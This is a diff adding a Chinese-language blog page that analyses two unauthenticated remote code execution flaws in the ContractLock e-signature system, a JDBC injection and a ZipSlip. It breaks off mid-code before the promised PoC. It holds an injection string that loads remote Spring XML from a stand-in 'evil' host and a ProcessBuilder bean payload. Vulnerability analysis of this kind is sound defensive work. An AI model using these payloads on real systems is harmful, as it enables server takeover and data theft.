@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>契约锁远程代码执行漏洞分析 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>契约锁远程代码执行漏洞分析</h1>
+<time>2026-07-30</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: 契约锁远程代码执行漏洞分析</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-漏洞背景与影响概述">1. 漏洞背景与影响概述</a></li>
+<li><a href="#2-契约锁系统架构与攻击面">2. 契约锁系统架构与攻击面</a></li>
+<li><a href="#3-qvd-2025-23408未授权jdbc注入rce">3. QVD-2025-23408：未授权JDBC注入RCE</a></li>
+<li><a href="#4-jdbc注入到rce的完整攻击链剖析">4. JDBC注入到RCE的完整攻击链剖析</a></li>
+<li><a href="#5-qvd-2025-27432zipslip路径穿越rce">5. QVD-2025-27432：ZipSlip路径穿越RCE</a></li>
+<li><a href="#6-从zipslip到rce热加载补丁机制滥用">6. 从ZipSlip到RCE：热加载补丁机制滥用</a></li>
+<li><a href="#7-完整利用poc">7. 完整利用PoC</a></li>
+<li><a href="#8-根因总结与攻击面对比">8. 根因总结与攻击面对比</a></li>
+<li><a href="#9-防御方案">9. 防御方案</a></li>
+<li><a href="#免责声明">免责声明</a></li>
+</ul>
+<hr />
+<h2>1. 漏洞背景与影响概述</h2>
+<p>契约锁（ContractLock）是上海亘岩网络科技有限公司推出的电子签章及印章管控平台，提供数字身份、电子签章、印章管控及数据存证服务，广泛应用于政府、金融、制造等行业的合同签署与印章管理场景。由于涉及高度敏感的法律文书和企业核心数据，其安全性至关重要。</p>
+<p>2025年6月至7月，安全研究机构连续披露契约锁电子签章系统存在两个高危远程代码执行（RCE）漏洞：</p>
+<table>
+<thead>
+<tr>
+<th>漏洞编号</th>
+<th>漏洞类型</th>
+<th>所需权限</th>
+<th>影响范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>QVD-2025-23408</td>
+<td>未授权JDBC注入 → RCE</td>
+<td>无需认证</td>
+<td>4.0.* ~ 5.3.*</td>
+</tr>
+<tr>
+<td>QVD-2025-27432</td>
+<td>ZipSlip路径穿越 → RCE</td>
+<td>无需认证</td>
+<td>4.0.x ~ 5.3.x</td>
+</tr>
+</tbody>
+</table>
+<p>两个漏洞均可被未授权攻击者远程利用，直接导致服务器被完全控制、敏感签章数据泄露、业务系统沦陷。本文将从代码审计角度深入剖析两个漏洞的根因、利用链与防御方案。</p>
+<p><strong>影响版本矩阵：</strong></p>
+<div class="highlight"><pre><span></span><code>漏洞 QVD-2025-23408 (JDBC注入):
+├── 4.0.* &lt;= 契约锁 &lt;= 4.3.7  且 补丁版本 &lt; 1.3.5
+└── 4.3.8 &lt;= 契约锁 &lt;= 5.3.*  且 补丁版本 &lt; 2.1.5
+
+漏洞 QVD-2025-27432 (ZipSlip):
+├── 4.0.x &lt;= 契约锁 &lt;= 4.3.7  且 补丁版本 &lt; 1.3.8
+└── 4.3.8 &lt;= 契约锁 &lt;= 5.3.x  且 补丁版本 &lt; 2.1.8
+</code></pre></div>
+
+<hr />
+<h2>2. 契约锁系统架构与攻击面</h2>
+<h3>2.1 整体架构</h3>
+<p>契约锁电子签章系统基于Java/Spring技术栈构建，典型部署架构如下：</p>
+<div class="highlight"><pre><span></span><code>┌──────────────────────────────────────────────────────┐
+│                    互联网 / 内网客户端                  │
+│         (浏览器 / API调用方 / 集成系统)                │
+└──────────────────────┬───────────────────────────────┘
+                       │ HTTPS
+┌──────────────────────▼───────────────────────────────┐
+│              契约锁管理控制台 (Spring MVC)              │
+│  ┌────────────┐  ┌──────────────┐  ┌──────────────┐  │
+│  │ SetupController│ │ PdfVerifier  │  │ 补丁热加载    │  │
+│  │ /setup/dbtest │ │ 组件(OFD/PDF) │  │ PatchManager │  │
+│  └──────┬─────┘  └──────┬───────┘  └──────┬───────┘  │
+│         │               │                 │           │
+│  ┌──────▼─────────────▼─────────────────▼─────────┐  │
+│  │           Spring Bean 容器 (ApplicationContext)  │  │
+│  │    ← 恶意XML可在此加载并实例化任意Bean →          │  │
+│  └────────────────────────────────────────────────┘  │
+└──────────────────────┬───────────────────────────────┘
+                       │
+         ┌─────────────┼─────────────┐
+         ▼             ▼             ▼
+   ┌──────────┐  ┌──────────┐  ┌──────────────┐
+   │ 数据库    │  │ 文件存储  │  │ 印章/证书库   │
+   │ PG/MySQL │  │ 本地磁盘  │  │ (高敏感)     │
+   └──────────┘  └──────────┘  └──────────────┘
+</code></pre></div>
+
+<h3>2.2 关键攻击面</h3>
+<p>本次两个漏洞分别命中了系统中的两个高危攻击面：</p>
+<ol>
+<li><strong>安装初始化接口</strong>：<code>/setup/dbtest</code> 用于系统初始化阶段测试数据库连接，因设计缺陷未做鉴权，且JDBC连接参数完全可控。</li>
+<li><strong>文件验证组件</strong>：<code>PDFVerifier</code> 用于验证OFD/PDF签署文件的有效性，在解压OFD文件时存在ZipSlip路径穿越。</li>
+</ol>
+<hr />
+<h2>3. QVD-2025-23408：未授权JDBC注入RCE</h2>
+<h3>3.1 漏洞入口：未授权的setup接口</h3>
+<p>漏洞的入口点是 <code>/setup/dbtest</code>（或 <code>/api/setup/dbtest</code>）接口。该接口用于系统初始化阶段测试数据库连接是否正常。</p>
+<p>在 <code>com.qiyuesuo.config.ConsoleConfiguration</code> 配置类中，明确定义了哪些接口不需要鉴权：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// com.qiyuesuo.config.ConsoleConfiguration （简化示意）</span>
+<span class="nd">@Configuration</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ConsoleConfiguration</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">WebSecurityConfigurerAdapter</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nd">@Override</span>
+<span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">configure</span><span class="p">(</span><span class="n">HttpSecurity</span><span class="w"> </span><span class="n">http</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">http</span><span class="p">.</span><span class="na">authorizeRequests</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="na">antMatchers</span><span class="p">(</span>
+<span class="w">                </span><span class="s">&quot;/setup/**&quot;</span><span class="p">,</span><span class="w">          </span><span class="c1">// ← setup接口全部放行，无需认证!</span>
+<span class="w">                </span><span class="s">&quot;/api/setup/**&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;/login&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="s">&quot;/static/**&quot;</span>
+<span class="w">            </span><span class="p">)</span>
+<span class="w">            </span><span class="p">.</span><span class="na">permitAll</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="na">anyRequest</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="na">authenticated</span><span class="p">();</span>
+<span class="w">        </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>/setup/**</code> 路径被配置为 <code>permitAll()</code>，这意味着 <strong>任何人都无需登录即可访问 <code>/setup/dbtest</code> 接口</strong>。这一配置的初衷可能是为了在系统首次安装、数据库尚未配置时允许访问初始化向导，但问题在于该接口在生产环境中依然保持可访问状态，且没有额外限制（如仅在未初始化状态时放行）。</p>
+<h3>3.2 控制器层：参数完全可控</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// com.qiyuesuo.setup.SetupController （简化示意）</span>
+<span class="nd">@Controller</span>
+<span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&quot;/setup&quot;</span><span class="p">)</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SetupController</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nd">@Autowired</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">SetupService</span><span class="w"> </span><span class="n">setupService</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/dbtest&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="nd">@ResponseBody</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">dbtest</span><span class="p">(</span>
+<span class="w">            </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">db</span><span class="p">,</span><span class="w">        </span><span class="c1">// 数据库类型: POSTGRESQL / MYSQL</span>
+<span class="w">            </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w">      </span><span class="c1">// 主机地址</span>
+<span class="w">            </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">port</span><span class="p">,</span><span class="w">      </span><span class="c1">// 端口</span>
+<span class="w">            </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w">  </span><span class="c1">// 用户名</span>
+<span class="w">            </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w">       </span><span class="c1">// ← 数据库名，关键注入点!</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 直接将用户输入传入validateDatabase</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">setupService</span><span class="p">.</span><span class="na">validateDatabase</span><span class="p">(</span><span class="n">db</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>控制器接收 <code>db</code>、<code>host</code>、<code>port</code>、<code>username</code>、<code>name</code> 五个参数，其中 <code>name</code>（数据库名）参数直接拼接到JDBC连接字符串中，且未做任何过滤或校验。</p>
+<h3>3.3 Service层：JDBC连接字符串拼接</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// com.qiyuesuo.setup.SetupService （简化示意）</span>
+<span class="nd">@Service</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SetupService</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nd">@Autowired</span>
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">DatabaseService</span><span class="w"> </span><span class="n">databaseService</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">validateDatabase</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">db</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">port</span><span class="p">,</span>
+<span class="w">                                   </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 调用dbset建立数据库连接</span>
+<span class="w">        </span><span class="n">DatabaseConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DatabaseConfig</span><span class="p">(</span><span class="n">db</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">dbtest</span><span class="p">(</span><span class="n">config</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">dbtest</span><span class="p">(</span><span class="n">DatabaseConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 获取数据库连接 — 这里触发JDBC连接</span>
+<span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">databaseService</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">config</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">conn</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">isValid</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">success</span><span class="p">(</span><span class="s">&quot;数据库连接成功&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;数据库连接失败&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// com.qiyuesuo.setup.DatabaseService （简化示意）</span>
+<span class="nd">@Service</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DatabaseService</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="nf">getConnection</span><span class="p">(</span><span class="n">DatabaseConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">;</span>
+<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">getDb</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;POSTGRESQL&quot;</span><span class="p">:</span>
+<span class="w">                </span><span class="c1">// 关键漏洞点: name参数直接拼接进JDBC URL</span>
+<span class="w">                </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;jdbc:postgresql://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getHost</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getPort</span><span class="p">()</span>
+<span class="w">                    </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">  </span><span class="c1">// ← name无任何过滤!</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;MYSQL&quot;</span><span class="p">:</span>
+<span class="w">                </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;jdbc:mysql://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getHost</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getPort</span><span class="p">()</span>
+<span class="w">                    </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">            </span><span class="k">default</span><span class="p">:</span>
+<span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">(</span><span class="s">&quot;Unsupported db type&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// Class.forName + DriverManager.getConnection 触发JDBC连接</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getUsername</span><span class="p">(),</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">getPassword</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><code>config.getName()</code> 的值被直接拼接进JDBC URL，没有任何字符过滤、白名单校验或参数化处理。这就是JDBC注入的根本原因。</p>
+<h3>3.4 数据流与注入点</h3>
+<div class="highlight"><pre><span></span><code><span class="err">用户请求</span><span class="o">:</span>
+<span class="w">  </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;test?socketFactory=org.springframework...ClassPathXmlApplicationContext&amp;socketFactoryArg=http://evil/1.xml&quot;</span>
+
+<span class="err">拼接后的</span><span class="n">JDBC</span><span class="w"> </span><span class="n">URL</span><span class="o">:</span>
+<span class="w">  </span><span class="n">jdbc</span><span class="o">:</span><span class="n">postgresql</span><span class="o">://</span><span class="n">localhost</span><span class="o">:</span><span class="mi">5321</span><span class="o">/</span>
+<span class="w">    </span><span class="n">test</span><span class="o">?</span><span class="n">socketFactory</span><span class="o">=</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">support</span><span class="o">.</span><span class="na">ClassPathXmlApplicationContext</span>
+<span class="w">        </span><span class="o">&amp;</span><span class="n">socketFactoryArg</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="n">evil</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="na">xml</span>
+<span class="w">         </span><span class="err">│</span><span class="w">                              </span><span class="err">│</span>
+<span class="w">         </span><span class="err">│</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="n">JDBC连接参数注入</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="err">指向攻击者控制的恶意</span><span class="n">XML</span>
+<span class="w">         </span><span class="err">│</span><span class="w">  </span><span class="n">PostgreSQL</span><span class="w"> </span><span class="n">JDBC驱动支持</span><span class="w">       </span><span class="err">│</span>
+<span class="w">         </span><span class="err">│</span><span class="w">  </span><span class="n">socketFactory参数指定自定义</span><span class="w">     </span><span class="err">│</span>
+<span class="w">         </span><span class="err">│</span><span class="w">  </span><span class="n">SocketFactory实现类</span><span class="w">            </span><span class="err">│</span>
+<span class="w">         </span><span class="err">└──────────────────────────────┘</span>
+</code></pre></div>
+
+<p>PostgreSQL JDBC驱动支持通过URL参数 <code>socketFactory</code> 指定自定义的Socket工厂类。当驱动尝试建立连接时，会实例化 <code>socketFactory</code> 指定的类。攻击者将其指向 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code>，并通过 <code>socketFactoryArg</code> 传入一个远程恶意Spring XML的URL，从而触发Spring Bean的加载和实例化——即任意代码执行。</p>
+<hr />
+<h2>4. JDBC注入到RCE的完整攻击链剖析</h2>
+<h3>4.1 攻击链全景</h3>
+<div class="highlight"><pre><span></span><code>攻击者                          契约锁服务器                    攻击者VPS
+  │                                │                            │
+  │ 1.POST /setup/dbtest           │                            │
+  │  name=test?socketFactory=...   │                            │
+  │ ─────────────────────────────&gt; │                            │
+  │                                │ 2.DriverManager            │
+  │                                │   .getConnection(url)      │
+  │                                │   解析socketFactory参数     │
+  │                                │                            │
+  │                                │ 3.实例化ClassPathXml─────&gt; │ 4.返回恶意
+  │                                │   ApplicationContext       │   Spring XML
+  │                                │   加载远程XML               │ &lt;──────────
+  │                                │                            │
+  │                                │ 5.解析XML中的Bean定义        │
+  │                                │   &lt;bean class=&quot;ProcessBuilder&quot;│
+  │                                │    init-method=&quot;start&quot;&gt;    │
+  │                                │                            │
+  │                                │ 6.ProcessBuilder.start()   │
+  │                                │   执行系统命令!              │
+  │                                │   (calc / reverse shell)   │
+  │ &lt;────────── 7.命令执行结果 ────│                            │
+  │                                │                            │
+</code></pre></div>
+
+<h3>4.2 为什么ClassPathXmlApplicationContext能RCE</h3>
+<p><code>ClassPathXmlApplicationContext</code> 是Spring Framework的核心类，其构造函数接收一个XML资源URL，会解析该XML并实例化其中定义的所有Bean。关键在于Spring XML支持通过 <code>init-method</code> 属性指定Bean实例化后自动调用的方法。</p>
+<p>当攻击者构造如下XML时：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;bean</span><span class="w"> </span><span class="na">id=</span><span class="s">&quot;exec&quot;</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;java.lang.ProcessBuilder&quot;</span><span class="w"> </span><span class="na">init-method=</span><span class="s">&quot;start&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;constructor-arg&gt;</span>
+<span class="w">        </span><span class="nt">&lt;list&gt;</span>
+<span class="w">            </span><span class="nt">&lt;value&gt;</span>cmd<span class="nt">&lt;/value&gt;</span>
+<span class="w">            </span><span class="nt">&lt;value&gt;</span>/c<span class="nt">&lt;/value&gt;</span>
+<span class="w">            </span><span class="nt">&lt;value&gt;</span>calc<span class="nt">&lt;/value&gt;</span>
+<span class="w">        </span><span class="nt">&lt;/list&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/constructor-arg&gt;</span>
+<span class="nt">&lt;/bean&gt;</span>
+</code></pre></div>
+
+<p>Spring容器会：
+1. 实例化 <code>java.lang.ProcessBuilder</code>，传入 <code>["cmd", "/c", "calc"]</code> 作为构造参数
+2. 因为指定了 <code>init-method="start"</code>，自动调用 <code>ProcessBuilder.start()</code> 方法
+3. <code>start()</code> 方法执行命令 <code>cmd /c calc</code></p>
+<p>这是一个经典的Spring4Shell风格的利用手法——<strong>利用Spring Bean的生命周期回调机制（init-method）实现无显式方法调用的命令执行</strong>。</p>
+<h3>4.3 不同数据库驱动的利用差异</h3>
+<table>
+<thead>
+<tr>
+<th>数据库类型</th>
+<th>JDBC驱动</th>
+<th>可利用参数</th>
+<th>触发类</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PostgreSQL</td>
+<td>postgresql.jar</td>
+<td>socketFactory / socketFactoryArg</td>
+<td>ClassPathXmlApplicationContext</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>mysql-connector-java</td>
+<td>socketFactory / connectionAttributes</td>
+<td>ClassPathXmlApplicationContext / JDBC反序列化</td>
+</tr>
+<tr>
+<td>H2</td>
+<td>h2.jar</td>
+<td>init / runscript</td>
+<td>RUNSCRIPT执行SQL</td>
+</tr>
+</tbody>
+</table>
+<p>PostgreSQL和MySQL驱动都支持 <code>socketFactory</code> 参数，因此两个数据库类型均可利用。MySQL驱动还可能存在基于 <code>autoDeserialize=true</code> 的JDBC反序列化攻击路径。</p>
+<hr />
+<h2>5. QVD-2025-27432：ZipSlip路径穿越RCE</h2>
+<h3>5.1 漏洞组件：PDFVerifier</h3>
+<p>QVD-2025-27432 漏洞位于契约锁的 <code>PDFVerifier</code> 组件中。该组件负责验证用户上传的OFD（Open Fixed-layout Document，开放版式文档）和PDF签署文件的有效性。</p>
+<p>OFD格式本质上是一个ZIP压缩包，内部包含XML描述文件和签名信息。验证OFD文件时需要先解压，这引入了ZipSlip路径穿越风险。</p>
+<h3>5.2 漏洞代码审计</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// com.qiyuesuo.pdfverifier.OfdVerifyHandler （简化示意）</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">OfdVerifyHandler</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">OfdVerifyResponse</span><span class="w"> </span><span class="nf">verify</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">pdfBytes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 1. 判断是否为OFD格式</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isOfd</span><span class="p">(</span><span class="n">pdfBytes</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">OfdVerifyResponse</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&quot;非OFD文件&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">// 2. 验证签名信息</span>
+<span class="w">        </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isOfd</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">fileBytes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 关键漏洞点: 先解压，再检查文件名是否包含&quot;OFD&quot;标识</span>
+<span class="w">            </span><span class="n">List</span><span class="o">&lt;</span><span class="n">ZipEntry</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unzip</span><span class="p">(</span><span class="n">fileBytes</span><span class="p">);</span><span class="w">  </span><span class="c1">// ← 解压时未校验路径!</span>
+
+<span class="w">            </span><span class="c1">// 检查解压后的文件名是否包含 OFD 主文件标识</span>
+<span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">ZipEntry</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">entries</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span>
+<span class="w">                </span><span class="c1">// 漏洞: 此检查在解压之后执行，文件已被写入磁盘!</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">OfdStrucUtils</span><span class="p">.</span><span class="na">OFD_MAIN_FILE</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">ZipEntry</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">unzip</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">fileBytes</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">ZipEntry</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span>
+<span class="w">        </span><span class="n">ZipInputStream</span><span class="w"> </span><span class="n">zis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ZipInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">fileBytes</span><span class="p">));</span>
+<span class="w">        </span><span class="n">ZipEntry</span><span class="w"> </span><span class="n">entry</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// 漏洞根因: 直接使用entry.getName()拼接路径，未做穿越检查</span>
